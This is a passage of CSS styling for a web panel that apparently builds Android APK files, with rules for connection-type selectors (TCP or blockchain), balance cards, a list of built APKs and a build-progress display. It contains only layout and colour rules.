        margin-top: 6px;
    }
    
    .method-btn {
        padding: 6px 16px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        font-size: 12px;
        color: var(--text-secondary);
        cursor: pointer;
    }
    
    .method-btn input {
        display: none;
    }
    
    .method-btn--active {
        background: var(--accent-primary);
        border-color: var(--accent-primary);
        color: #fff;
    }
    
    /* Connection Type Selector */
    .connection-type-selector {
        display: flex;
        gap: 12px;
        margin-bottom: 12px;
    }
    
    .connection-type-btn {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        padding: 12px 16px;
        background: var(--bg-primary);
        border: 2px solid var(--border-color);
        border-radius: 8px;
        font-size: 13px;
        color: var(--text-secondary);
        cursor: pointer;
        transition: all 0.2s;
    }
    
    .connection-type-btn input {
        display: none;
    }
    
    .connection-type-btn--active {
        background: var(--accent-primary);
        border-color: var(--accent-primary);
        color: #fff;
    }
    
    .connection-type-btn:hover {
        border-color: var(--accent-primary);
    }
    
    .tcp-config, .blockchain-config {
        margin-top: 16px;
        padding-top: 16px;
        border-top: 1px solid var(--border-color);
    }
    
    .inline-actions {
        display: flex;
        gap: 6px;
        flex-wrap: wrap;
        margin-top: 6px;
    }
    
    .balance-row {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 8px;
        margin-top: 8px;
    }
    
    .balance-card {
        padding: 10px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
    }
    
    .balance-label {
        font-size: 11px;
        color: var(--text-secondary);
        margin-bottom: 4px;
    }
    
    .balance-value {
        font-size: 14px;
        font-weight: 600;
        color: var(--text-primary);
    }
    
    .balance-address {
        font-size: 11px;
        color: var(--text-muted);
        font-family: var(--font-mono);
        word-break: break-all;
    }
    
    .blockchain-actions {
        display: flex;
        gap: 8px;
        flex-wrap: wrap;
        margin-top: 10px;
    }
    
    .info-box {
        padding: 12px;
        background: rgba(33, 150, 243, 0.1);
        border-left: 3px solid #2196F3;
        border-radius: 4px;
        margin-top: 8px;
    }
    
    .selected-file {
        margin-left: 10px;
        font-size: 12px;
        color: var(--accent-success);
    }
    
    /* Build Button */
    .builder-actions {
        display: flex;
        justify-content: center;
        padding: 16px 0;
    }
    
    .build-btn {
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 12px 32px;
        background: var(--accent-primary);
        border: none;
        border-radius: 8px;
        color: #fff;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.15s;
    }
    
    .build-btn:hover:not(:disabled) {
        background: #4c9aed;
    }
    
    .build-btn:disabled {
        opacity: 0.5;
        cursor: not-allowed;
    }
    
    .build-btn i {
        font-size: 16px;
    }
    
    /* APK List */
    .apk-list {
        display: flex;
        flex-direction: column;
        gap: 8px;
        max-height: 300px;
        overflow-y: auto;
    }
    
    .apk-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 10px 12px;
        background: var(--bg-primary);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        transition: all 0.15s;
    }
    
    .apk-item:hover {
        border-color: var(--accent-primary);
        background: var(--bg-tertiary);
    }
    
    .apk-info {
        flex: 1;
        min-width: 0;
    }
    
    .apk-name {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 13px;
        font-weight: 500;
        color: var(--text-primary);
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    
    .apk-name i {
        color: #3ddc84;
        flex-shrink: 0;
    }
    
    .apk-meta {
        display: flex;
        gap: 12px;
        margin-top: 4px;
        font-size: 11px;
        color: var(--text-muted);
    }
    
    .apk-size {
        color: var(--text-secondary);
    }
    
    .apk-actions {
        display: flex;
        gap: 6px;
        flex-shrink: 0;
        margin-left: 12px;
    }
    
    .apk-empty {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 32px;
        color: var(--text-muted);
        text-align: center;
    }
    
    .apk-empty i {
        font-size: 32px;
        margin-bottom: 8px;
        opacity: 0.5;
    }
    
    .apk-empty p {
        margin: 0;
        font-size: 13px;
    }
    
    /* Build Progress */
    .build-progress-container {
        padding: 16px;
    }
    
    .build-progress-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 12px;
    }
    
    .build-progress-title {
        display: flex;
        align-items: center;
        gap: 8px;
        font-size: 14px;
        font-weight: 600;
        color: var(--text-primary);
    }
    
    .build-progress-title i.spinner {
        animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }
    
    .build-progress-percent {
        font-size: 14px;
        font-weight: 600;
        color: var(--accent-primary);
        font-family: var(--font-mono);
    }
    
    .build-progress-bar {
        width: 100%;
        height: 8px;
        background: var(--bg-primary);
        border-radius: 4px;
        overflow: hidden;
        margin-bottom: 16px;
    }
    
    .build-progress-bar__fill {
        height: 100%;
        background: var(--accent-primary);
        transition: width 0.3s ease;
        border-radius: 4px;
    }
    
    .build-progress-bar__fill--complete {
        background: var(--accent-success);
    }
    
    .build-progress-bar__fill--error {
        background: var(--accent-danger);
    }
    
    .build-progress-steps {
        display: flex;
        flex-direction: column;
        gap: 8px;
    }
    
    .build-step {
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 8px 12px;
        background: var(--bg-primary);
        border-radius: 6px;
        font-size: 12px;
        color: var(--text-secondary);
        transition: all 0.2s;
    }
    
    .build-step--active {
        background: rgba(88, 166, 255, 0.1);
        border-left: 3px solid var(--accent-primary);
        color: var(--text-primary);
    }
    
    .build-step--complete {
        background: rgba(63, 185, 80, 0.1);
        border-left: 3px solid var(--accent-success);
        color: var(--accent-success);
    }
    
    .build-step--error {
        background: rgba(244, 67, 54, 0.1);
        border-left: 3px solid var(--accent-danger);
        color: var(--accent-danger);
    }
    
    .build-step i {
        font-size: 14px;
    }
</style>
